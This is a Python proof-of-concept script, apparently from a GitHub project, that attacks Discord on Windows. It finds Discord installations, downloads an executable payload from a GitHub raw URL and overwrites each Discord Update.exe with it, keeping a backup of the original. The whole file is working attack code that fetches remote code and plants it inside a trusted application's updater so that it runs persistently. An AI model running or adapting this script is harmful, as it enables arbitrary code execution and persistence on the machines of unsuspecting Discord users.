import os
from shutil import copy
from datetime import datetime
from glob import glob
from ntpath import join, dirname, exists

import requests

__version__ = (1, 0, 0)
__author__ = "Rodriguez Moon"
__github__ = "https://github.com/rodriguez-moon/discord-update-mitm"


class Discord:
    def __init__(self):
        self.payload_url = "https://raw.githubusercontent.com/rodriguez-moon/discord-update-mitm/main/payload/Update.exe"
        self.payload = None

    def get_time(self) -> datetime:
        return datetime.now().strftime(f"[%D %T]")

    def get_discord_directories(self) -> list:
        path = join(os.getenv("localappdata"), "discord*", "Update.exe")
        return glob(path)

    def get_payload(self, payload_url: str) -> bytes:
        print(f"{self.get_time()} Fetching payload from GitHub...")
        res = requests.get(payload_url) 
        return res.content

    def write_payload(self, path: str, payload: bytes) -> None:
        with open(path, "wb") as f:
            f.write(payload)

    def replace_updater(self, path: str, payload: bytes) -> bool | None:
        backup = join(dirname(path), "Update.bak.exe")
        if not exists(backup):
            copy(path, backup)
        try:
            os.remove(path)
        except (PermissionError, FileNotFoundError):
            pass
        self.write_payload(path, payload)
        return True

    def main(self):
        print("Discord Updater MitM Attack -- Proof of Concept")
        print(__github__)

        print(f"\n{self.get_time()} Scanning system for Discord installations...")
        paths = self.get_discord_directories()

        if not paths:
            raise FileNotFoundError(f"{self.get_time()} Discord installation not found.")
        else:
            print(f"{self.get_time()} Found {len(paths)} Discord clients.")

        payload = self.get_payload(self.payload_url)

        for path in paths:
            res = self.replace_updater(path, payload)
            if res:
                print(f"{self.get_time()} Successfully injected payload into '{path}'.")
            else:
                print(f"{self.get_time()} Failed to inject payload into '{path}'.")


if __name__ == "__main__" and os.name == "nt":
    mitm = Discord()
    mitm.main()
